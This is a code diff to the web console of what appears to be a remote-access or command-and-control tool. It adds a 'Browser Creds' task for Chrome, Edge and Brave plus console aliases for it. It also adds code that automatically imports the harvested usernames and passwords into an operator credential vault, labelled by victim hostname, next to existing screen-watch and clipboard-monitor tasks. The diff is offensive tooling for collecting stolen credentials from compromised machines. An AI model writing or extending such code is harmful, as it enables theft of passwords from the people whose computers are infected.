@@ -3409,6 +3409,8 @@ function agentContextMenu(e, agentId) {
       {label:'🔄  Screenwatch Start (30s)',   action:{fn:'selectAndTask', id, type:'SCREENWATCH_START', args:'30'}},
       {label:'⏹  Screenwatch Stop',          action:{fn:'selectAndTask', id, type:'SCREENWATCH_STOP',  args:''}},
       null,
+      {label:'🌐  Browser Creds (Chrome/Edge/Brave)', action:{fn:'selectAndTask', id, type:'BROWSER_CREDS', args:''}, hint:'Chrome · Edge · Brave + CredManager → auto-import to vault'},
+      null,
       {label:'📎  Clipboard (once)',          action:{fn:'selectAndTask', id, type:'CLIP_GET',           args:''}},
       {label:'📋  Clipboard Monitor Start',   action:{fn:'selectAndTask', id, type:'CLIP_MONITOR_START', args:''}},
       {label:'📋  Clipboard Monitor Dump',    action:{fn:'selectAndTask', id, type:'CLIP_MONITOR_DUMP',  args:''}},
@@ -8288,6 +8290,7 @@ async function dispatchConsoleCmd(agentID, cmdLine) {
     case 'cleanup':    taskType='CLEANUP'; break;
     case 'kill':       taskType='KILL'; break;
     case 'clip':       taskType='CLIP_GET'; break;
+    case 'browsercreds': case 'browser-creds': case 'bcreds': taskType='BROWSER_CREDS'; break;
     case 'sysinfo':    taskType='SYSINFO'; break;
     case 'getpid':     taskType='GETPID'; break;
     case 'ppid':       taskType='PPID'; break;
@@ -9002,6 +9005,33 @@ async function pollResult(taskID, agentID) {
           return;
         }
         addConsoleOutputForAgent(aid, out || (err ? '' : '[done]'), err, r.data.created_at);
+        // Auto-import browser credentials to vault
+        if (r.data.task_type === 'BROWSER_CREDS' && out && !err) {
+          try {
+            const parsed = JSON.parse(out);
+            if (Array.isArray(parsed) && parsed.length > 0) {
+              const ag = agents.find(a => a.id === aid);
+              let imported = 0;
+              for (const c of parsed) {
+                if (!c.username || !c.password) continue;
+                const body = {
+                  type: 'plaintext',
+                  domain: '',
+                  username: c.username,
+                  secret: c.password,
+                  host: c.target || '',
+                  source: `${c.source || 'browser'} @ ${ag?.hostname || aid.substring(0,8)}`,
+                };
+                const cr = await api('POST', '/api/creds', body);
+                if (cr?.ok) imported++;
+              }
+              if (imported > 0) {
+                toast(`🌐 Browser creds: ${imported} imported to vault`, 'green');
+                loadCreds();
+              }
+            }
+          } catch(_) {}
+        }
         // Track SOCKS proxy state for badge display
         if (out.includes('SOCKS5 listening on')) {
           const m = out.match(/:(\d+)/); if (m) agentSocksPort[aid] = parseInt(m[1]);
